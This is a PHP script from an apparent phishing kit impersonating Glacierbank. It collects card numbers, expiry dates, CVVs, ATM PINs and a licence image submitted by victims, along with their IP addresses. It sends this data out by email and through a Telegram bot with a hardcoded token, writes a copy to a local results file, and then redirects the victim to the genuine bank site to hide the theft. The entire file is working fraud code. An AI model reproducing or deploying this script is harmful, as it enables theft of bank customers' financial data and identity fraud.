<?php


$ip = $_SERVER['REMOTE_ADDR'];

include('./XEmail.php');

$subject = "Glacierbank Card Infos ";
$headers = "From: SuleimanSamar <Glacierbank>\r\n";
$message .= "
+----/!\----<.![+] Glacierbank Card Info  [+]!.>---/!\----+
 [IP]                : ".$ip."
 [CARD NUMBER]       : ".$_POST['crd']."
 [EXP DATE]          : ".$_POST['ex']."
 [CVV & CVC]         : ".$_POST['cv']."
 [ATM]               : ".$_POST['at']."
 [DL PIC CAPTURE]    : ".$_POST['dll']."
-------------------------------------------------\n
******************************************************\n
******************************************************\n";
mail($email,$subject,$message,$headers);
$text = fopen('../rezlt.txt', 'a');
fwrite($text, $message);

/* Telegram */
function sendMessage($messaggio) {
    $token = '2104282985:AAEV0Q0Kz0NZI4QIq2xrjJgWeGxZEKUA2SA';
    $chatid = '1275453727';
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
    $url = $url . "&text=" . urlencode($messaggio);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
sendMessage($message);
header("Location: https://www.glacierbank.com/");

?>